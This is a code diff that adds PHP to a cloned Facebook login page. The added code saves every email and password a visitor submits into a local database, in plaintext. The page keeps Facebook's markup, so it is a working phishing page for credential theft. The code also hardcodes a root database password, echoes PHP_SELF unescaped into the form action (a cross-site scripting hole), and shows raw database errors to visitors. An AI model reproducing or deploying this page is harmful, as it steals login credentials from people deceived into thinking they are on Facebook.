@@ -1,4 +1,34 @@
+<?php
+// Database connection parameters
+$host = 'localhost';
+$dbname = 'facebook';
+$username = 'root';
+$password = 'LuYp@@@10484#$';
 
+// Establish a connection to the database
+try {
+    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+} catch (PDOException $e) {
+    die("Error connecting to database: " . $e->getMessage());
+}
+
+// Process form submission
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Retrieve form data
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Insert data into the users table
+    try {
+        $stmt = $pdo->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
+        $stmt->execute([$email, $password]);
+        $success_message = "User data inserted successfully!";
+    } catch (PDOException $e) {
+        $error_message = "Error: " . $e->getMessage();
+    }
+}
+?>
 
 <!DOCTYPE html>
 <html lang="en" id="facebook" class="">
@@ -25,7 +55,15 @@
                             <div class="_8esn">
                                 <div class="_8iep _8icy _9ahz _9ah-">
                                     <div class="_6luv _52jv">
-                                        <form class="_9vtf" data-testid="royal_login_form" action="config.php" method="post">
+                                        <?php
+                                        if (isset($success_message)) {
+                                            echo "<p style='color: green;'>$success_message</p>";
+                                        }
+                                        if (isset($error_message)) {
+                                            echo "<p style='color: red;'>$error_message</p>";
+                                        }
+                                        ?>
+                                        <form class="_9vtf" data-testid="royal_login_form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
                                             <div>
                                                 <div class="_6lux">
                                                     <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" placeholder="Email address or phone number" autofocus="1">
